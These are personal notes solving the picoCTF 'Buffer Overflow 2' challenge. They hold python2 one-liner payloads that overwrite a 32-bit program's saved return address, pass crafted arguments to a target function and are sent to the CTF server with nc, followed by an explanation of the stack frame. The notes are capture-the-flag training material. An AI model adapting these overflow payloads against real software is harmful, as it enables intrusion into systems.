# notes.md

- pico ctf BUFFER OVERFLOW 2

- https://www.youtube.com/watch?v=eJ0FmCfD-1g&ab_channel=JohnHammond

above video was used for hint for the "crafted frame requiring RIP" bit


> interesting numbers
```
python2 -c "print('A'*108)" | ./vuln


python2 -c "print('A'*107+'XXXXY' + '\x96\x92\x04\x08' +'\x0d\xf0\xfe\xca'  )" | ./vuln



working RIP ovewrite
python2 -c "print('A'*112 + '\x96\x92\x04\x08' +  '\x0d\xf0\x0d\xf0' +'\x0d\xf0\xfe\xca'  )" | ./vuln 


# still working rip
# now the "args" are at lower mem addresses on the stack
python2 -c "print('A'*104 + '\x0d\xf0\xfe\xca' + '\x0d\xf0\x0d\xf0' + '\x96\x92\x04\x08'  )" | ./vuln

```


## solution

> working remote payload
```
python2 -c "print('A'*112 + '\x9a\x92\x04\x08' + 'CCCC' +'\x0d\xf0\xfe\xca'  +'\x0d\xf0\x0d\xf0'  )" | nc saturn.picoctf.net 52463
```

> explanation of payload
```
first we fill the buffer, clobber EBP for current frame with A
next we write a new RET address onto the saved rip '\x9a\x92\x04\x08' 

Unlike other buffer overflows I have done WE NEED  A STACK FRAME
	this is because we are going to pass arguments to the function that we jump to
	a stack frame EXPECTS
		locals
		saved eIP
		then arguments
	we build a stack frame
		part of the ret is to pop the above into eIP
		therefore at point of our overflow we need to provide the saved eIP for our frame we are buiding
			it doesnt have to be legitimate
			it only needs to be legitimate if we want to do a 2nd return/jump
			thus we can use 'CCCC'
		below our crafted saved eIP we put the arguments to our function call
		first arg is at lowest address (seemingly backward order from our theory, but ignore for now)
```


## lessons learnt
```py
struct.pack('<I', 0x08049296)
python2 -c "print('A'*112 + '\x9a\x92\x04\x08' + 'CCCC' +'\x0d\xf0\xfe\xca'  +'\x0d\xf0\x0d\xf0'  )" 
```
python payloads are best generated with python2, python3 tries to encode it and ruins it
struct.pack will little endian encode a hex integer for you
python payloads can be printed to terminal, they can be copy pasted you just have to trust they are there (because they are)